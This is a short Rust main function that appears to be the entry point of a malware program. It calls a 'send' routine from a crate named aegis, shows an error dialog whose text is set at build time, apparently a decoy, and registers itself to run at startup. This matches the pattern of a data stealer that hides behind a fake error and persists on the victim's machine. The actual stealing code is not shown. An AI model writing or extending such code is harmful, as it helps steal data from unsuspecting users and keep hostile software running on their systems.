#[tokio::main]
async fn main() {
    aegis::send().await;

    aegis::show_error(
        option_env!("FE_TITLE").unwrap(),
        option_env!("FE_MSG").unwrap(),
    )
    .await;

    aegis::hook_to_startup().await.ok();
}
